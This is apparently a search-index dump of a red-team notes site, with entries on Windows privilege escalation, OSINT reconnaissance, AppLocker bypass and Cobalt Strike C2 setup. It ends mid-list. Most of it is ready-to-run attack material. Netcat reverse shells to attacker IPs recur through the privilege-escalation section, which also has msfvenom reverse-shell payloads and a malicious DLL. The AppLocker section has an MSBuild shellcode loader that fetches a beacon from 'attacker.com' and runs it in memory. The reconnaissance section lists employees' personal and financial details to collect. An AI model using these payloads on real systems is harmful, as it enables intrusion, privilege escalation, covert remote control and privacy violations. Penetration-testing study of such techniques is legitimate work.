						"content": "Privilege Escalation usually involves going from a lower permission to a higher permission. Enumeration Scripts: There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples: PowerUp.ps1: https: github.com PowerShellMafia PowerSploit tree master Privesc Invoke-AllChecks WinPEAS: https: github.com carlospolop privilege-escalation-awesome-scripts-suite tree master winPEAS .\\WinPEAS.exe .\\WinPEAS.bat BeRoot: https: github.com AlessandroZ BeRoot .\\beRoot.exe Privesc: https: github.com enjoiz Privesc Invoke-PrivEsc Info: https: gist.github.com HarmJ0y 184f9822b195c52dd50c379ed3117993 Kernel Vulnerabilities We can exploit some kernel vulnerabilities in order to privesc. All Windows Server 2008 R2 without HOTFIXES are vulenrable to MS15 and MS16 (MS15-051) Sherlock.ps1 Is a powershell script that we can run out of memory in order to find some vulnerabilities. First we need to modify it and add the following line to the end of the script: Find-AllVulns Once added, we just need to start http server and executed directly from powershell. powershell.exe IEX(New-Object System.Net.Webclient).DownloadString('http: ip-addr:port Sherlock.ps1') https: github.com rasta-mouse Sherlock blob master Sherlock.ps1 Suggester windows-exploit-suggester.py or wesng are amazing scripts that do this work. https: github.com AonCyberLabs Windows-Exploit-Suggester Remember to update the database. . windows-exploit-suggester.py --update We just need to execute systeminfo and save the output into a file on the windows target machine. systeminfo &gt; systeminfo.txt Once downloaded to our attacking machine we just need to execute the following command: . windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt Compiling Exploits Sometimes we need to compile our exploits in order to get the binary or executable. For 64-bits: x86_64-w64-mingw32-gcc exploit.c -o exploit.exe For 32-bits: i686-w64-mingw32-gcc exploit.c -o exploit.exe MS09-20 opt windows-kernel-exploits MS09-020 MS09-020-KB970483-CVE-2009-1535-IIS6 IIS6.0.exe Usage: .\\IIS6.0.exe \"c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.15 4444\" MS15-051 opt windows-kernel-exploits MS15-051 MS15-051-KB3045171 MS15-051.exe Usage: .\\ms15-051.exe \"c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.15 4444\" MS16-032 opt windows-kernel-exploits MS16-032 x64 ms16-032.exe Usage: .\\ms16-032.exe MS17-010 (EternalBlue) https: github.com dful MS17-010 COMahawk (CVE-2019-1405) .\\COMahawk.exe \"C: windows temp rev.exe\" We can check the windows version by using winver command (GUI needed). https: www.exploit-db.com exploits 47684 Windows XP SP0 SP1 - upnphost sc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.10.10.10 4444 -e C:\\WINDOWS\\System32\\cmd.exe\" sc config upnphost obj= \".\\LocalSystem\" password= \"\" sc qc upnphost sc config upnphost depend= \"\" net start upnphost Maybe it will fail due to missing some dependency, try the following: sc config SSDPSRV start=auto net start SSDPSRV net stop upnphost net start upnphost sc config upnphost depend=\"\" Alert: SPACES are mandatory to the work of the exploit. https: sohvaxus.github.io content winxp-sp1-privesc.html Check privileges With the following command we can check the privileges that is assigned to the pwned user: whoami priv SeImpersonatePrivilege RottenPotato (Juicy Potato) Juicy Potato is another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. Is a sugared version of Rotten Potato. Download the latest realese and execute it. .\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \" c c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.21 4444\" -t * PrintSpoofer One way to gain system user on latest Operative System such as Windows10 or Server 2016 2019, is using the printspoofer exploit. Donwload the latest release and execute it on the target machine to gain privs. PrintSpoofer64.exe -i -c cmd SweetPotato .NET assembly to abuse SeImpersonatePrivilege. https: github.com CCob SweetPotato SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc &lt;base64&gt;\" SweetPotato.exe -p C:\\Temp\\Payload.exe SeLoadDriverPrivilege We are able to load a driver, so we can load a vulnerable driver, then exploit it. Load Capcom.sys To load the driver we need first to create a C++ Console APP on Visual Studio (Not Code!) and paste the following script. Alert: Remove line: #include “stdafx.h” https: raw.githubusercontent.com TarlogicSecurity EoPLoadDriver master eoploaddriver.cpp Once compiled With Release x64 we need to download Capcom.sys driver. (https: github.com FuzzySecurity Capcom-Rootkit blob master Driver Capcom.sys) Copy the driver and the binary to the target machine and execute it. .\\EoPLoadDriver.exe System\\CurrentControlSet\\dfserv C:\\ProgramData\\Capcom.sys [+] Enabling SeLoadDriverPrivilege [+] SeLoadDriverPrivilege Enabled [+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\dfserv NTSTATUS: 00000000, WinError: 0 NTSTATUS codes: 0xC000003B - STATUS_OBJECT_PATH_SYNTAX_BAD 0x00000034 - STATUS_OBJECT_NAME_NOT_FOUND Exploiting Capcom.sys I modified the following project: https: github.com tandasat ExploitCapcom. Download the project and open the ExploitCapcom.sln (Visual Studio Project) with Visual Studio. Modify the line 410 of ExpliotCapCom.cpp and compile it. Create the exploit.exe payload with msfvenom: msfvenom -a x86 -p windows shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; exploit.exe And upload all the files and execute the ExploitCapcom.exe: .\\ExploitCapcom.exe https: www.tarlogic.com en blog abusing-seloaddriverprivilege-for-privilege-escalation Unquoted Service Path Every Windows service has his access route to the executable. If this route is not quoted and contains spaces or others separators like this example C:\\Program Files\\First Folder\\myexecutable.exe , the service will try to access to the resource in the following order: C:\\Program.exe C:\\Program Files\\First.exe C:\\Program Files\\First Folder\\myexecutable.exe If we can put our executable in one of the paths that it is checked before the real route, when we restart the service we will obtain a shell. wmic service get name,pathname,displayname,startmode | findstr i auto | findstr i v \"C:\\Windows\\\\\" | findstr i v '\"' Get-WmiObject -Class win32_service | select pathname With PowerUp we can list services with unquoted paths and a space in their name. Get-ServiceUnquoted -Verbose We need to ensure that the service is running by LocalSystem: sc qc &lt;service&gt; Get-Service Once we’ve found the binaries that are vulnerable to unquoted service path, we need to find where we have permissions to write, for that work we can use icacls or Get-Acl in PowerShell: icacls \"C:\\Porgram Files\" Get-Acl -Path \"C:\\Program Files\" Info: We need to find some with write permissions (W) Once we’ve found the writeable path, we will need to create our malicious binary with msfvenom and upload in the right directory: msfvenom -p windows shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f exe -o First.exe Finally we need to restart the service to gain access to system: Stop-Service &lt;service&gt; sc stop &lt;service&gt; Start-Service &lt;service&gt; sc start &lt;service&gt; Note: Its a easier way with PowerUp.ps1 Write-ServiceBinary -Name &lt;ServiceName&gt; -UserName &lt;User&gt; -Password &lt;Passwd&gt; -Path &lt;Path&gt; Always Install Elevated If these 2 registers are enabled (value is 0x1), any user can install .msi ** files as NT AUTHORITY\\SYSTEM** reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer v AlwaysInstallElevated Meterpreter msfvenom -p windows x64 shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt;-f msi -o shell.msi EXE to MSI To create a custom MSI we first need to install a extension to our Visual Studio. https: marketplace.visualstudio.com items?itemName=visualstudioclient.MicrosoftVisualStudio2017InstallerProjects Once installed we need to create a Setup Wizard project on a folder where our binary is located. A pop up will be prompted with some steps to do. Select Create a setup for a Windows application Add the binary to execute during explotation. And finish the setup. When the project is created, we can modify some properties such as the target platform, author and manufacturer of the installer. Next step is to add the file into the installation folder. To do that task right click on the solution View -&gt; Custom Actions Righ click another time in Install Install -&gt; Add Custom Action... and select the binary inside the Application Folder. Then select the EXE file and change the Run64Bit property to True. Finally we just need to save and compile our installer with right-click on the solution and select Build. Executing the MSI msiexec quiet qn i c:\\users\\user\\documents\\shell.msi Note: I’d problems while exploiting it via WIN-RM. Try another way to get shell. To remove the MSI, you can use: msiexec q n uninstall shell.msi Weak Service Permissions A service running as NT AUTHORITY SYSTEM with incorrect file permissions might allow to escalate privileges. You can replace the binary, restart the service and get system. net start wmic service list brief sc query Get-Service With PowerUp we can get the services where the current user can write to its binary path or change arguments to the binary. Get-ModifiableServiceFile -Verbose We can also check the services whose configuration the current user can modify. Get-ModifiableService -Verbose Modifying the service configuration Check service permissions with accesschk from sysinternals. accesschk -c &lt;service&gt; -l There are another Powershell script that dig a little deeper and print which service rights we have. https: rohnspowershellblog.wordpress.com 2013 03 19 viewing-service-acls . .\\Get-ServiceAcl.ps1 Get-ServiceAcl -Name service-name | select -ExpandProperty Access And finally modify it. sc stop &lt;service&gt; sc config &lt;service&gt; binPath=\"C:\\Temp\\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;\" sc qc &lt;service&gt; #Check correct assigment sc start &lt;service&gt; Binary Permissions We can also have sufficient rights to modify the binary itself, with Get-Acl from powershell we can check it. Get-Acl -Path \"C:\\Program Files\\VulnServ\\vulnserv.exe\" | fl Writeable Folders We can also have rights to write into the folder but not into the binary itself. We cab check permissions on folders with icacls or Get-Acl. C:\\&gt;icacls exacqVisionEsm icacls exacqVisionEsm exacqVisionEsm NT AUTHORITY\\NETWORK SERVICE:(RX) S-1-5-21-1861402468-3453913150-4246083462-1001:(RX) BUILTIN\\Administrators:(I)(OI)(CI)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) NT AUTHORITY\\Authenticated Users:(I)(M) NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(IO)(M) Permissions: Full access (F): Change the binary to the malicious one. PRIV PATH Modify access (M) : Rename the binary to bin.bak and copy the malicious binary to the original path bin.exe. PRIV PATH Read and Execute access (RX): Can read and execute, nothing here. Read-only acess (R): Only can read, nothing here. Write-only acess (W): Only can write, same as (F), change the binary to the malicious one. PRIV PATH Get-Acl -Path \"C:\\Program Files\\VulnServ\\vulnserv.exe\" | fl Changing the original binary: move .\\enterprisesystemmanager.exe .\\enterprisesystemmanager.bak move C:\\Windows\\Temp\\payload.exe .\\enterprisesystemmanager.exe Check the configuration of the service to see how to restart the service. sc qc \"exacqVision Enterprise System Manager Web Service\" Restart Manually If you have sufficient permissions over the service restart it manually. net stop ServiceName net start ServiceName AUTO_START enabled If AUTO_START flag is enabled restart the machine shutdown r DLL Hijacking When we have permissions to overwrite the DLL or the DLL is missing we can create ours. Msfvenom A dll can also be created with msfvenom. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f dll -o mal.dll Manual DLL The following C code is an example of our malicious dll. #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\"cmd.exe c:\\Temp\\nc.exe -e cmd.exe &lt;IP&gt; &lt;PORT&gt;\"); ExitProcess(0); } return TRUE; } Compiling the DLL #x64 x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll #x86 i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll WSL (Windows Subsystem for Linux) Windows Subsystem for Linux is a compatibility layer for running Linux binary executables natively on Windows 10 and Windows Server 2019. Location: C:\\Windows\\System32\\wsl.exe Executing wsl.exe we can get a subsystem shell (Linux) or we can search the subsystem fileroot on the windows machine. C:\\Users\\User\\AppData\\Local\\Packages\\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\\LocalState\\rootfs\\ Inside the Linux filesystem as root, you can search for passwords or some other interesting things. From Administrator to System As it is known the maximum privilege account of windows systems is NT AUTHORITY\\SYSTEM , so we need to spawn a shell with that account. Once our user is already on Administrators group, we can check it with different forms: net user admin net sessions #only can execute local administrators There are different forms to spawn a system shell: With PsExec.exe With psexec we can spawn a new shell with system. . PsExec.exe s i accepteula powershell.exe Note: It spawn a new shell With a new Service sc create &lt;service_name&gt; binpath= \"C:\\Users\\User\\nc.exe &lt;ip-addr&gt; &lt;port&gt; -e cmd.exe\" type= own type= interact After starting our new service we will get the System shell on our handler: sc start &lt;service_name&gt; Windows Scheduler Similar to crontab, Windows Scheduler is a component of Microsoft Windows that provides the ability to schedule the launch of programs or scripts at pre-defined times. If you found some of this running proceses tasklist, maybe you need to take a look: WScheduler.exe WService.exe # Some other binary that starts with WS (WindowsScheduler) So we will examinate the Events System Sheduler directory: C:\\Program Files (x86)\\SystemScheduler\\Events Find some logs files to see which program is scheduled, and replace the binary with yout malicious one. References https: medium.com @SumitVerma101 windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae https: blog.geoda-security.com 2017 06 elevate-from-admin-to-nt-authoritysystem.html https: itm4n.github.io printspoofer-abusing-impersonate-privileges https: github.com swisskyrepo PayloadsAllTheThings blob master Methodology%20and%20Resources Windows%20-%20Privilege%20Escalation.md#cve-2019-1388 https: kb.digital-detective.net display BF Understanding+and+Working+in+Protected+Mode+Internet+Explorer#:~:text=A%20Low%20integrity%20process%2C%20like,files%20in%20low%20integrity%20folders."
					}

					
				
			
		
			
				
					,
					

					"reconnaissance-information-gathering": {
						"id": "reconnaissance-information-gathering",
						"title": "Information Gathering",
						"category": "",
						"url": " /reconnaissance/information-gathering/",
						"content": "Information Gathering is the act of gathering different kinds of informationagainst the targeted victim or system. There are two types of information gathering, passive or OSINT (Open Source INTelligence) information gathering which means gathering as much information about our target wihout exposing our presence, and active information gathering which techniques interact directly with the target system. Passive Information Gathering (OSINT) Is a technique to gather information without any interaction with the target. There are many tools that are listed in OSINT Framework. OSINT Framework The OSINT Framework includes information gathering tools and websites in one central location. Some tools listed in the framework cover more disciplines than information security. https: osintframework.com Search Engines Google offers the opportunity to perform advanced search queries using special operators: AND, OR, +, -, \"\" And this is some examples of queries: Query Type Google Dork Cache cache:www.example.com Link link:www.example.com Site site:www.website.com Filetype filetype:pdf Title intitle:index.of Harvesting Harversting is extract information from documents and files. We can find information such as emails, workers and so on. theHarvester is a tool that automates this working theharvester -d example.com -b google theharvester -d example.com -b linkedin Social Media The spread of social networks has made information gathering extremely important and effective. With the help of social media, a pentester can esaily gather employee’s personal informacion such as phone numbers, addresses, history and CV. We want to collect the following information about the employees: Age Phone Number Addresses Occupation Business Interests Email Addresses Website Owned Related Documents Financial Info Infrastructures The main goal here is to retrieve data such as: Domains Netblocks or IP addresses Mail servers ISP’s used (Internet Server Provider) Any other technical information Domains and subdomains Given a domain, the first source for information is WHOIS. There are a lot of online tools that allow you top use WHOIS: http: who.is http: whois.domaintools.com https: www.betterwhois.com https: searchdns.netcraft.com There are some tools that search subdomains like amass or sublist3r: sublist3r -d [Domain] amass enum -d example.com Nmmapper is an online tool that finds a lots of subdomains: https: www.nmmapper.com sys tools subdomainfinder The following user guide helps us a lot to inspect some awesome queries. https: github.com OWASP Amass blob master doc user_guide.md Recon-ng Recon-ng is a moduled-base framework for web-based information gathering. Recon-ng displays the results of a module to the terminal but it also stores them in a database. Searching Modules We can add modules from the recon-ng with marketplace. marketplace search &lt;MODULE&gt; marketplace info &lt;MODULE&gt; marketplace install &lt;MODULE&gt; Using Modules We need to load the module before using it: marketplace load &lt;MODULE&gt; info options set &lt;OPTION&gt; &lt;VALUE&gt; Display results We can display some different results, since hosts to vulnerabilities. show #To see all posibilities of displaying show &lt;SELECTION&gt; Best Recon-ng Modules recon domains-hosts google_site_web #Search subdomains on Google with Google Dorks recon hosts-hosts resolve #Update hosts table with the DNS resolution Shodan As we gather information on our target, it is important to remember that traditional websites are just one part of the internet. Shodan is a search engine that crawls devices connected to the internet. The following repository gives us some examples of what we can do with this brilliant tool https: github.com jakejarvis awesome-shodan-queries Open-Source Code One such of interesting information are open-source projects and online code repositories, such as GitHub, GitLab and SourceForge. GitLeaks Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos. Gitleaks is an easy-to-use, all-in-one solution for finding secrets, past or present, in your code. gitleaks --repo-url=https: github.com my-insecure repo -v https: github.com zricethezav gitleaks"
					}

					
				
			
		
			
				
					,
					

					"red-team-application-whitelisting": {
						"id": "red-team-application-whitelisting",
						"title": "Application Whitelisting",
						"category": "",
						"url": " /red-team/application-whitelisting/",
						"content": "AppLocker AppLoker is an application whitelisting technology for Windows Operating Systems. Restricts applications ans scripts that are allowed to run on a machine, defined through a set of policies which are set by GPO. Rules can be based on file attributes such as name, version, hash or path, and can allow or deny. AppLocker will also change the PowerShell Language Mode from FullLanguage to ConstrainedLanguage. Policy Enumeration The policy can be read from two places, directly from GPO or from the local registry of a machine. Via downloading GPO We can read the GPO by downloading the Regitry.pol. beacon&gt; powershell Get-DomainGPO -Domain corp.local | ? { $_.DisplayName -like \"*AppLocker*\" } | select displayname, gpcfilesyspath displayname gpcfilesyspath ----------- -------------- AppLocker \\\\corp.local\\SysVol\\dev-studio.com\\Policies\\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2} beacon&gt; download \\\\corp.local\\SysVol\\dev-studio.com\\Policies\\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\\Machine\\Registry.pol [*] started download of \\\\corp.local\\SysVol\\dev-studio.com\\Policies\\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\\Machine\\Registry.pol (7616 bytes) [*] download of Registry.pol is complete We can parse the pol file with Parse-PolFile from the GPRegistryPolicyParser package. https: github.com PowerShell GPRegistryPolicyParser Parse-PolFile .\\Registry.pol KeyName : Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\a61c8b2c-a319-4cd0-9690-d2177cad7b51 ValueName : Value ValueType : REG_SZ ValueLength : 700 ValueData : &lt;FilePathRule Id=\"a61c8b2c-a319-4cd0-9690-d2177cad7b51\" Name=\"(Default Rule) All files located in the Windows folder\" Description=\"Allows members of the Everyone group to run applications that are located in the Windows folder.\" UserOrGroupSid=\"S-1-1-0\" Action=\"Allow\"&gt;&lt;Conditions&gt;&lt;FilePathCondition Path=\"%WINDIR%\\*\" &gt;&lt; Conditions&gt;&lt; FilePathRule&gt; Via local registry We can query the registry at HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2 to obtain the information. Get-ChildItem \"HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2\" Note: We can see that DLL enforcement is not commonly enabled. Get-ChildItem \"HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\" Writeable Paths The default rules allow execution on C:\\Program Files and C:\\Windows including subdirectories. So moving laterally to a protected machine via psexec is trivial since the service executable is written into C:\\Windows. But, if you’re on a protected machine as a standard user, there are several directories inside C:\\Windows where we can write, one for example is C:\\Windows\\Tasks. This would allow us to copy an executable into this directory and run it. Note: When enumerating the rules, we can find some additional weak rules that sysadmins have set. An example is: &lt;FilePathCondition Path=\"*\\AppV\\*\" &gt; LOLBAS Living Off The Land Binaries, Scripts and Libraries (LOLBAS) are executables and scripts thant come as part of Windows but allow for arbitrary code execution. They allow us to bypass AppLocker, because they’re allowed to execute under the normal criteia and may also be digitally signed by Microsoft. https: lolbas-project.github.io And example is MSBuild, if is not blocked, it can be used to execute arbitrary C# code from a .csproj file. This could be turned into a basic shellcode injector. &lt;Project ToolsVersion=\"4.0\" xmlns=\"http: schemas.microsoft.com developer msbuild 2003\"&gt; &lt;Target Name=\"MSBuild\"&gt; &lt;MSBuildTest &gt; &lt; Target&gt; &lt;UsingTask TaskName=\"MSBuildTest\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt; &lt;Task&gt; &lt;Code Type=\"Class\" Language=\"cs\"&gt; &lt;![CDATA[ using System; using System.Net; using System.Runtime.InteropServices; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class MSBuildTest : Task, ITask { public override bool Execute() { byte[] shellcode; using (var client = new WebClient()) { client.BaseAddress = \"http: attacker.com\"; shellcode = client.DownloadData(\"beacon.bin\"); } var hKernel = LoadLibrary(\"kernel32.dll\"); var hVa = GetProcAddress(hKernel, \"VirtualAlloc\"); var hCt = GetProcAddress(hKernel, \"CreateThread\"); var va = Marshal.GetDelegateForFunctionPointer&lt;AllocateVirtualMemory&gt;(hVa); var ct = Marshal.GetDelegateForFunctionPointer&lt;CreateThread&gt;(hCt); var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40); Marshal.Copy(shellcode, 0, hMemory, shellcode.Length); var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero); WaitForSingleObject(t, 0xFFFFFFFF); return true; } [DllImport(\"kernel32\", CharSet = CharSet.Ansi)] private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName); [DllImport(\"kernel32\", CharSet = CharSet.Ansi)] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds); [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); } ]]&gt; &lt; Code&gt; &lt; Task&gt; &lt; UsingTask&gt; &lt; Project&gt; PowerShell CLM If you can find an AppLocker bypass to execute arbitrary code, you can also break out of PowerShell Constrained Language by using the Unmanaged PowerShell runspace. With Cobalt Strike is simply using powerpick command. beacon&gt; powershell $ExecutionContext.SessionState.LanguageMode ConstrainedLanguage beacon&gt; powerpick $ExecutionContext.SessionState.LanguageMode FullLanguage This can also be done in C#. &lt;Project ToolsVersion=\"4.0\" xmlns=\"http: schemas.microsoft.com developer msbuild 2003\"&gt; &lt;Target Name=\"MSBuild\"&gt; &lt;MSBuildTest &gt; &lt; Target&gt; &lt;UsingTask TaskName=\"MSBuildTest\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt; &lt;Task&gt; &lt;Reference Include=\"System.Management.Automation\" &gt; &lt;Code Type=\"Class\" Language=\"cs\"&gt; &lt;![CDATA[ using System; using System.Linq; using System.Management.Automation; using System.Management.Automation.Runspaces; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class MSBuildTest : Task, ITask { public override bool Execute() { using (var runspace = RunspaceFactory.CreateRunspace()) { runspace.Open(); using (var posh = PowerShell.Create()) { posh.Runspace = runspace; posh.AddScript(\"$ExecutionContext.SessionState.LanguageMode\"); var results = posh.Invoke(); var output = string.Join(Environment.NewLine, results.Select(r =&gt; r.ToString()).ToArray()); Console.WriteLine(output); } } return true; } } ]]&gt; &lt; Code&gt; &lt; Task&gt; &lt; UsingTask&gt; &lt; Project&gt; Beacon DLL If DLL enforcement is not enabled, we can call exported functions from DLLs on disk via rundll32. Beacon’s DLL exposes several exports including DllMain and StartW. These can be changed in the Artifact Kit under src-main dllmain.def. C:\\Windows\\System32\\rundll32.exe http_x64.dll,StartW"
					}

					
				
			
		
			
				
					,
					

					"red-team-c2-cobaltstrike": {
						"id": "red-team-c2-cobaltstrike",
						"title": "C2 - Cobalt Strike",
						"category": "",
						"url": " /red-team/c2-cobaltstrike/",
						"content": "Cobalt Strike was one of the first public red team command and control frameworks. Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike is split into client and a server components. Check more info in the official documentation. https: hstechdocs.helpsystems.com manuals cobaltstrike current userguide content topics welcome_main.htm Installation sudo apt-add-repository 'deb http: security.debian.org debian-security stretch updates main' sudo apt-get update sudo apt-get install openjdk-11-jdk sudo apt install proxychains socat sudo update-alternatives --config java #Select openjdk-11 Starting the Team Server The server, referred to as the team server, is the controller for the Beacon payload and the host for Cobalt Strike’s social engineering features. The team server also stores data collected by Cobalt Strike and it manages logging. The server run on a supported Linux systems. To start the team server, execute the following command: . teamserver &lt;IP&gt; &lt;Password&gt; &lt;Malleable C2 Profile&gt; [*] Generating X509 certificate and keystore (for SSL) [+] Team server is up on 0.0.0.0:50050 [*] SHA256 hash of SSL cert is: eadd46ff4f74d582290ce1755513ddfc0ffd736f90bed5d8d662ee113faccb43 Once started we can launch the client and connect with the password used. Verify the server’s fingerprint before connecting. OPSEC Note: The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn’t expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN. Running as a Service Running the team server as a service allows us to start it automatically when the server starts up. First we need to create the following file etc systemd system teamserver.service: [Unit] Description=Cobalt Strike Team Server After=network.target StartLimitIntervalSec=0 [Service] Type=simple Restart=always RestartSec=1 User=root WorkingDirectory= home user cobaltstrike ExecStart= home user cobaltstrike teamserver 10.10.10.10 password c2-profiles normal webbug.profile [Install] WantedBy=multi-user.target Next, reload the systemd manager and check run teh service. sudo systemctl daemon-reload sudo systemctl start teamserver.service Finally, the server should start on boot. sudo systemctl enable teamserver.service Listeners A listener is a host port protocol combination that listens for inconming communication from a beacon. There are two types: Egress: Allow beacons to communicate outside of the target network to our team server. The default egreess listener types are HTTP S and DNS. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile. Peer-to-peer: Allow beacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly. In order to create a listener go to Cobalt Strike -&gt; Listeners and click the button Add. Egress Listeners HTTP S The HTTP listener allows beacon to send and receive C2 messages over HTTP GET and POST requests. DNS The DNS listener allows Beacon to send and receive C2 messages over several Lookup Response types including A,AAAA and TXT. TXT are used by default because they can hold the most amount of data. This requires to create one ore more DNS records for adomain that the team server will be authorative for. Above an example: Name Type Data @ A 10.10.10.10 ns1 A 10.10.10.10 pics NS ns1.example.com The DNS Beacon can then preform lookup requests, such as &lt;c2data&gt;.pics.example.com, which will be routed over the internet’s DNS infrastructure. After adding the beacon with the DNS Resolver pics.example.com we can check it: $ dig @ns1.example.com test.pics.example.com +short 0.0.0.0 OPSEC Alert: 0.0.0.0 is the default response, it can be changed in the Malleable C2 Profile. Peer-to-Peer (P2P) listeners Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are TCP and SMB. Link beacon is specially useful when it comes to pivoting, and other situation where you need to spawn an additional beacon payload. Note: Help to keep the number of direct outbound connections. We can create a P2P listener by selecting Beacon SMB or Beacon TCP payload. If executing a P2P payload on a target manually, it won’t appear in the UI until the link (for SMB Beacons) or connect (for TCP Beacons) command is used. You can also unlink P2P Beacons and then use link again from another Beacon to reorganise the chain. Commands such as spawn, spanwas, inject and jump can be use with these payloads. There are no limit of chain connections but if any of the middle beacons gets disconnected, all the child beacons would be disconnected, but we can link or connect another time. Beacon TCP While creating the beacon we need to select the port where the target machine will listen and if we want that the target bind to localhost or in all interfaces. Once executed the payload for a Beacon TCP a listener will be launched waiting to a connection. In order to spawn the beacon we need to connect to it with the command connect. Usage of command connect: beacon&gt; help connect Use: connect [target] connect [target] [port] Connect to a TCP Beacon and re-establish control of it. All requests for connected Beacon will go through this Beacon. Use 'unlink' to disconnect from a TCP Beacon. So we just need to select the host and the port. beacon&gt; connect 10.10.10.10 4444 After that a chain on beacons will be created. Note: Beacon TCP binding in localhost are recommended to privilege escalations. It may become necessary to open ports on the Windows Firewall to facilitate lateral movement. Add rule: netsh advfirewall firewall add rule name=\"Allow 4444\" dir=in action=allow protocol=TCP localport=4444 Delete rule: netsh advfirewall firewall delete rule name=\"Allow 4444\" protocol=TCP localport=4444 Beacon SMB While creating the beacon we only need to select the pipename that will be used. Same as TCP the beacon will listen to a connection. In that case we need to link pipenames with link command. We can list them with: ls \\\\.\\pipe\\ Usage of link command: beacon&gt; help link Use: link [target] [pipe] link [target] Connect to an SMB Beacon and re-establish control of it. All requests for connected Beacon will go through this Beacon. Specify an explicit [pipe] to link to that pipename. The default pipe from the current profile is used otherwise. So we just have to select the target and the chosen pipename in the listener creation. beacon&gt; link 10.10.10.10 \\\\10.10.10.10\\pipe\\interprocess_28 We can also use link command again to reorganize the chain after getting disconnected. Notes: When moving laterally between targets, the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well. Pivot Listeners Pivot Listeners are another type of P2P listener that currently only uses TCP. It works in the opposite direction to the regular TCP listener. When a beacon is spawned a Beacon payload that uses the TCP listener, that beacon acts as a TCP server and waits for an incoming connection from an existing beacon. Pivot Listeners are not created via the Listeners menu, but are bound to individual beacons. This existing beacon will bind a port and listen for incoming connections acting as a TCP Server, and a Beacon payload that uses the pivot listener will act as the TCP client. It is very usefull in scenarios where you don’t know when the target will actually execute the payload and therefore when you need issue the connect command. To start a Pivot Listener right-click on an existing Beacon and select Pivoting-&gt;Listener. Once started, your selected port will be bound on that machine. Payloads There are two types of payloads: Staged: Staged payloads are tiny, when executed the real shellcode is transfered and execute. Stageless: It contains the whole shellcole which means is bigger than staged payloads. OPSEC Note: Staged payloads are useful when the delivery method is limited to an amount of data that we can send. However, they tend to have more indicators and is more detectable than stageless payloads. Cobalt Strike can generate both staged and stageless payloads. On GUI if we see a (S) means that is stageless. Staged Payloads Go to Attacks -&gt; Packages -&gt; Windows Executable: Stageless Payloads Go to Attacks -&gt; Packages -&gt; Windows Executable (S): OPSEC Note: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems. Beacon Interaction To interact click on Interact with rigth-click: To get a list of available commands type help. beacon&gt; help Beacon Commands =============== Command Description ------- ----------- argue Spoof arguments for matching processes blockdlls Block non-Microsoft DLLs in child processes browserpivot Setup a browser pivot session cancel Cancel a download that's in-progress cd Change directory checkin Call home and post data chromedump 